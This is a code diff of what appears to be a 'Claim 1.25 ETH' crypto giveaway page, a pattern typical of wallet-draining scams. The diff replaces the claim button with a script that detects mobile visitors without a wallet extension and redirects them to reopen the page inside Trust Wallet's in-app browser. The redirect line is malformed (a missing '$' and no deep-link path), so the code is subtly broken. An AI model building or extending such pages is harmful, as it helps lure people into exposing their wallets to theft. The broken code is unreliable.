@@ -111,8 +111,23 @@
                 </div>
 
                 <div class="claim-button-container">
-                    <button id="ethConnectWallet" class="eth-claim-button"><i class="fas fa-wallet"></i> Connect Wallet & Claim 1.25 ETH</button>
-                </div>
+                    <button id="openTrustWallet" style="display:none;">
+  Open in Trust Wallet
+</button>
+
+<script>
+  const btn = document.getElementById('openTrustWallet');
+  const dappUrl = encodeURIComponent(window.location.href);
+
+  // Check if the user is on mobile and NOT already inside a dApp browser
+  const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+  if (isMobile && typeof window.ethereum === 'undefined') {
+    btn.style.display = 'block';
+    btn.onclick = () => {
+      window.location.href = `https://trustwallet.com{dappUrl}`;
+    };
+  }
+</script> </div>
 
                 <div id="ethSuccessMessage" class="eth-success-message">
                     <i class="fas fa-check-circle" style="font-size:3rem;"></i>
